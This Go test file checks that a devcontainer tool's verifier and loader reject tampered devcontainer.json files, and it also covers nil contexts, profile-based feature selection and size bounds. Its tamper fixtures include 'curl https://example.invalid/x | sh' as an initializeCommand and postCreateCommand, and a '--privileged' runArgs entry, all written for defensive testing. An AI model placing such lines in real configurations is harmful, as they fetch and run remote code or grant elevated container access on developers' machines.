package devcontainer

import (
	"bytes"
	"context"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// injectTopLevelKey places an extra member at the head of a rendered configuration.
func injectTopLevelKey(t *testing.T, data []byte, member string) []byte {
	t.Helper()
	open := bytes.IndexByte(data, '{')
	if open < 0 {
		t.Fatal("rendered configuration carries no object")
	}
	tampered := make([]byte, 0, len(data)+len(member)+4)
	tampered = append(tampered, data[:open+1]...)
	tampered = append(tampered, []byte("\n  "+member+",")...)
	return append(tampered, data[open+1:]...)
}

// respellTopLevelKey rewrites one member name without touching its value. Go's
// JSON decoder matches member names case-insensitively, so the result still
// decodes into the managed struct and re-marshals to the spec spelling; only a
// comparison against the file itself can see it.
func respellTopLevelKey(t *testing.T, data []byte, from, to string) []byte {
	t.Helper()
	quoted := []byte(`"` + from + `"`)
	if !bytes.Contains(data, quoted) {
		t.Fatalf("rendered configuration carries no %q member", from)
	}
	return bytes.Replace(data, quoted, []byte(`"`+to+`"`), 1)
}

// tamperedConfig returns the rendered configuration altered as name describes.
// Every case here survives a typed decode and re-marshals to the managed
// render, which is what the previous re-render comparison certified as in sync.
func tamperedConfig(t *testing.T, rendered []byte, name string) []byte {
	t.Helper()
	switch name {
	case "initializeCommand":
		return injectTopLevelKey(t, rendered, `"initializeCommand": "curl https://example.invalid/x | sh"`)
	case "runArgs":
		return injectTopLevelKey(t, rendered, `"runArgs": ["--privileged"]`)
	case "nullOnCreateCommand":
		return injectTopLevelKey(t, rendered, `"onCreateCommand": null`)
	case "uppercasedKey":
		return respellTopLevelKey(t, rendered, "postCreateCommand", "POSTCREATECOMMAND")
	case "capitalisedKey":
		return respellTopLevelKey(t, rendered, "remoteUser", "RemoteUser")
	case "duplicatedKey":
		return injectTopLevelKey(t, rendered, `"postCreateCommand": "curl https://example.invalid/x | sh"`)
	case "trailingBrace":
		return append(bytes.Clone(rendered), []byte("}\n")...)
	case "trailingBracket":
		return append(bytes.Clone(rendered), []byte("]\n")...)
	case "trailingObject":
		return append(bytes.Clone(rendered), []byte(`{"initializeCommand":"curl https://example.invalid/x | sh"}`)...)
	}
	t.Fatalf("no tampering named %s", name)
	return nil
}

// TestVerifySeesKeysOutsideTheManagedSchema covers the whole file, not the seven
// fields the struct happens to carry: an injected key is drift, never silence.
func TestVerifySeesKeysOutsideTheManagedSchema(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "devcontainer.json")
	dc := &DevContainer{Name: "schema-test", RemoteUser: DefaultRemoteUser, PostCreateCommand: "make verify-all"}
	if err := WriteDevContainer(t.Context(), path, dc); err != nil {
		t.Fatal(err)
	}
	rendered, err := Render(dc)
	if err != nil {
		t.Fatal(err)
	}

	// 1. Positive: the configuration Praetor wrote still verifies.
	if err := Verify(t.Context(), path, dc); err != nil {
		t.Fatalf("matching configuration rejected: %v", err)
	}

	// 2. Negative and 3. boundary: an injected key, a key whose value is null,
	// the aliased and duplicated spellings a typed decode accepts, and content
	// after the configuration object.
	for _, tc := range []struct{ name, reason string }{
		{"initializeCommand", "initializeCommand"},
		{"runArgs", "runArgs"},
		{"nullOnCreateCommand", "onCreateCommand"},
		{"uppercasedKey", "does not match expected configuration"},
		{"capitalisedKey", "does not match expected configuration"},
		{"duplicatedKey", "does not match expected configuration"},
		{"trailingBrace", "does not match expected configuration"},
		{"trailingBracket", "does not match expected configuration"},
		{"trailingObject", "carries content after its configuration object"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if err := os.WriteFile(path, tamperedConfig(t, rendered, tc.name), 0644); err != nil {
				t.Fatal(err)
			}
			err := Verify(t.Context(), path, dc)
			if err == nil {
				t.Fatal("tampered configuration reported as in sync")
			}
			if !strings.Contains(err.Error(), tc.reason) {
				t.Fatalf("error does not name its reason: %v", err)
			}
		})
	}
}

// TestLoadDevContainerRefusesWhatVerifyRefuses pins the single decoder: the
// reader and the verifier must not disagree about what the schema admits.
func TestLoadDevContainerRefusesWhatVerifyRefuses(t *testing.T) {
	path := filepath.Join(t.TempDir(), "devcontainer.json")
	dc := &DevContainer{Name: "load-test", RemoteUser: DefaultRemoteUser}
	if err := WriteDevContainer(t.Context(), path, dc); err != nil {
		t.Fatal(err)
	}
	rendered, err := Render(dc)
	if err != nil {
		t.Fatal(err)
	}

	// 1. Positive: what Praetor wrote loads back unchanged.
	loaded, err := LoadDevContainer(t.Context(), path)
	if err != nil {
		t.Fatalf("written configuration rejected: %v", err)
	}
	if loaded.Name != dc.Name || loaded.RemoteUser != dc.RemoteUser {
		t.Fatalf("loaded configuration differs: %+v", loaded)
	}

	// 2. Negative: an unknown key is refused, not silently dropped.
	if err := os.WriteFile(path, tamperedConfig(t, rendered, "runArgs"), 0644); err != nil {
		t.Fatal(err)
	}
	if _, err := LoadDevContainer(t.Context(), path); err == nil || !strings.Contains(err.Error(), "runArgs") {
		t.Fatalf("LoadDevContainer dropped an unknown key: %v", err)
	}

	// 3. Boundary: a second document after the object is refused.
	if err := os.WriteFile(path, tamperedConfig(t, rendered, "trailingObject"), 0644); err != nil {
		t.Fatal(err)
	}
	if _, err := LoadDevContainer(t.Context(), path); err == nil || !strings.Contains(err.Error(), "carries content after") {
		t.Fatalf("LoadDevContainer accepted trailing content: %v", err)
	}
}

// TestDevContainerEntryPointsRejectAbsentContext enters the nil guards that the
// cancelled-context cases never reach.
func TestDevContainerEntryPointsRejectAbsentContext(t *testing.T) {
	var absent context.Context
	path := filepath.Join(t.TempDir(), "devcontainer.json")
	dc := &DevContainer{Name: "absent-context"}

	if err := WriteDevContainer(absent, path, dc); err == nil || !strings.Contains(err.Error(), "context cannot be nil") {
		t.Fatalf("WriteDevContainer accepted an absent context: %v", err)
	}
	if _, err := LoadDevContainer(absent, path); err == nil || !strings.Contains(err.Error(), "context cannot be nil") {
		t.Fatalf("LoadDevContainer accepted an absent context: %v", err)
	}
	if err := WriteBundle(absent, path, &Bundle{Config: dc}, false); err == nil || !strings.Contains(err.Error(), "requires context") {
		t.Fatalf("WriteBundle accepted an absent context: %v", err)
	}
	if _, err := os.Stat(path); !errors.Is(err, os.ErrNotExist) {
		t.Fatalf("an absent context still produced a file: %v", err)
	}
}

// TestSynthesizeFeaturesFollowsProfiles pins the profile gate on the legacy
// feature set, which has no catalog selection to fall back on.
func TestSynthesizeFeaturesFollowsProfiles(t *testing.T) {
	// 1. Positive: a repository without the native toolchain keeps the Go feature.
	plain, err := SynthesizeFromProfiles("app", []string{"framework"}, nil)
	if err != nil {
		t.Fatal(err)
	}
	if _, ok := plain.Features[GoFeatureRef]; !ok {
		t.Fatal("Go feature dropped for a Go repository")
	}

	// 2. Negative: the native GPU profile rejects Go tooling, so it gets no Go feature.
	native, err := SynthesizeFromProfiles("engine", []string{"  Native-GPU-Systems  "}, nil)
	if err != nil {
		t.Fatal(err)
	}
	if _, ok := native.Features[GoFeatureRef]; ok {
		t.Fatal("Go feature injected for native-gpu-systems")
	}
	for _, name := range native.Customizations.VSCode.Extensions {
		if name == "golang.go" {
			t.Fatal("Go extension injected for native-gpu-systems")
		}
	}

	// 3. Boundary: profiles is a list, so both can be declared together; the
	// startup command must agree with the feature set the gate produced.
	assertNoGoToolchain(t, "framework then native", []string{"framework", "native-gpu-systems"})
	assertNoGoToolchain(t, "native then framework", []string{"native-gpu-systems", "framework"})

	empty, err := SynthesizeFromProfiles("app", []string{}, nil)
	if err != nil {
		t.Fatal(err)
	}
	if _, ok := empty.Features[GoFeatureRef]; !ok {
		t.Fatal("Go feature dropped for an empty profile set")
	}
}

// assertNoGoToolchain fails when a profile set that receives no Go feature is
// nonetheless told to start by running the Go toolchain.
func assertNoGoToolchain(t *testing.T, name string, profiles []string) {
	t.Helper()
	dc, err := SynthesizeFromProfiles("engine", profiles, nil)
	if err != nil {
		t.Fatalf("%s: %v", name, err)
	}
	if _, ok := dc.Features[GoFeatureRef]; ok {
		t.Fatalf("%s: Go feature injected for native-gpu-systems", name)
	}
	if strings.Contains(dc.PostCreateCommand, "go run ") {
		t.Fatalf("%s: postCreateCommand runs Go without a Go toolchain: %q", name, dc.PostCreateCommand)
	}
}

// TestSynthesizeRefusesOversizedProfileSets pins the bound PrepareBundle already
// applies: an input past MaxLoopLimit is refused, never silently truncated into
// a container that contradicts the profiles it was handed.
func TestSynthesizeRefusesOversizedProfileSets(t *testing.T) {
	const reason = "exceed bounds"

	// 1. Positive: the largest accepted profile set still synthesizes.
	atLimit := make([]string, MaxLoopLimit)
	for i := range atLimit {
		atLimit[i] = "framework"
	}
	if _, err := SynthesizeFromProfiles("app", atLimit, nil); err != nil {
		t.Fatalf("profile set at the bound rejected: %v", err)
	}

	// 2. Negative: one profile past the bound is refused rather than truncated.
	oversized := append(append([]string{}, atLimit...), "native-gpu-systems")
	if _, err := SynthesizeFromProfiles("app", oversized, nil); err == nil || !strings.Contains(err.Error(), reason) {
		t.Fatalf("oversized profile set accepted: %v", err)
	}

	// 3. Boundary: facets and the name obey the same bound, and PrepareBundle
	// refuses the identical input for the identical reason.
	oversizedFacets := make([]string, MaxLoopLimit+1)
	for i := range oversizedFacets {
		oversizedFacets[i] = "security:high"
	}
	if _, err := SynthesizeFromProfiles("app", nil, oversizedFacets); err == nil || !strings.Contains(err.Error(), reason) {
		t.Fatalf("oversized facet set accepted: %v", err)
	}
	if _, err := SynthesizeFromProfiles(strings.Repeat("n", 513), nil, nil); err == nil || !strings.Contains(err.Error(), reason) {
		t.Fatalf("oversized name accepted: %v", err)
	}
	prepared := validateBootstrapInputs(t.Context(), "app", oversized, nil)
	if prepared == nil || !strings.Contains(prepared.Error(), reason) {
		t.Fatalf("PrepareBundle and Synthesize disagree about the bound: %v", prepared)
	}
}
